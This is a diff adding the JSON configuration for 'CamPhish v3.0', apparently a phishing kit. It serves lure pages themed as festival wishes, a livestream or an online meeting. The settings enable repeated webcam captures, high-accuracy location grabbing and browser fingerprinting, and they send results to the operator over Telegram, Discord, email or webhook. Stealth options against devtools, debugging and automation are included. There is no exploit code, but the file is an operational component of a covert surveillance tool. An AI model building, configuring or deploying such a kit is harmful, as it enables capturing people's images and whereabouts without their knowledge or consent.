@@ -1,0 +1,188 @@
+{
+  "general": {
+    "site_name": "CamPhish v3.0",
+    "admin_email": "admin@example.com",
+    "timezone": "Europe/Paris",
+    "auto_cleanup_days": 30
+  },
+  
+  "notifications": {
+    "telegram": {
+      "enabled": false,
+      "bot_token": "YOUR_BOT_TOKEN_HERE",
+      "chat_id": "YOUR_CHAT_ID_HERE",
+      "notify_on": {
+        "new_visit": true,
+        "capture": true,
+        "location": true,
+        "fingerprint": false,
+        "daily_summary": true
+      }
+    },
+    
+    "discord": {
+      "enabled": false,
+      "webhook_url": "YOUR_DISCORD_WEBHOOK_URL",
+      "notify_on": {
+        "new_visit": true,
+        "capture": true,
+        "location": true,
+        "fingerprint": false,
+        "daily_summary": true
+      }
+    },
+    
+    "email": {
+      "enabled": false,
+      "smtp_host": "smtp.gmail.com",
+      "smtp_port": 587,
+      "smtp_user": "your_email@gmail.com",
+      "smtp_pass": "your_app_password",
+      "to": "admin@example.com",
+      "notify_on": {
+        "new_visit": false,
+        "capture": true,
+        "location": true,
+        "fingerprint": false,
+        "daily_summary": true
+      }
+    },
+    
+    "webhook": {
+      "enabled": false,
+      "url": "https://your-server.com/webhook",
+      "method": "POST",
+      "headers": {
+        "Authorization": "Bearer YOUR_TOKEN"
+      }
+    }
+  },
+  
+  "features": {
+    "fingerprinting": {
+      "enabled": true,
+      "collect_canvas": true,
+      "collect_webgl": true,
+      "collect_audio": true,
+      "collect_fonts": true,
+      "collect_battery": false,
+      "collect_media_devices": false
+    },
+    
+    "video_capture": {
+      "enabled": false,
+      "duration_seconds": 5,
+      "quality": "medium",
+      "include_audio": false
+    },
+    
+    "location": {
+      "enabled": true,
+      "high_accuracy": true,
+      "timeout": 10000,
+      "retry_on_error": true
+    },
+    
+    "camera": {
+      "enabled": true,
+      "interval_seconds": 2,
+      "quality": 0.8,
+      "max_captures": 10
+    },
+    
+    "stealth_mode": {
+      "enabled": false,
+      "anti_devtools": false,
+      "anti_debug": false,
+      "code_obfuscation": false,
+      "anti_automation": false
+    }
+  },
+  
+  "templates": {
+    "default": "festivalwishes",
+    "rotation_enabled": false,
+    "rotation_interval": 10,
+    "available_templates": [
+      "festivalwishes",
+      "livestream",
+      "onlinemeeting"
+    ]
+  },
+  
+  "database": {
+    "enabled": false,
+    "type": "sqlite",
+    "path": "camphish.db",
+    "mysql": {
+      "host": "localhost",
+      "port": 3306,
+      "database": "camphish",
+      "username": "root",
+      "password": ""
+    }
+  },
+  
+  "security": {
+    "admin_panel": {
+      "enabled": false,
+      "username": "admin",
+      "password_hash": "$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi",
+      "2fa_enabled": false
+    },
+    
+    "rate_limiting": {
+      "enabled": true,
+      "max_requests_per_ip": 100,
+      "time_window_minutes": 60
+    },
+    
+    "ip_whitelist": [],
+    "ip_blacklist": [],
+    
+    "encryption": {
+      "enabled": false,
+      "algorithm": "AES-256-CBC",
+      "key": "GENERATE_RANDOM_32_CHAR_KEY"
+    }
+  },
+  
+  "analytics": {
+    "enabled": true,
+    "track_unique_visitors": true,
+    "track_user_flow": true,
+    "track_device_types": true,
+    "track_geolocation": true,
+    "retention_days": 90
+  },
+  
+  "storage": {
+    "captures_directory": "captures",
+    "locations_directory": "saved_locations",
+    "logs_directory": "logs",
+    "max_file_size_mb": 10,
+    "auto_delete_after_days": 30
+  },
+  
+  "advanced": {
+    "smart_routing": {
+      "enabled": false,
+      "route_by_country": false,
+      "route_by_device": false,
+      "route_by_time": false,
+      "route_by_language": false
+    },
+    
+    "chatbot": {
+      "enabled": false,
+      "personality": "friendly",
+      "auto_engage": true,
+      "delay_seconds": 3
+    },
+    
+    "minigames": {
+      "enabled": false,
+      "available_games": ["memory", "quiz", "flappy"]
+    }
+  }
+}
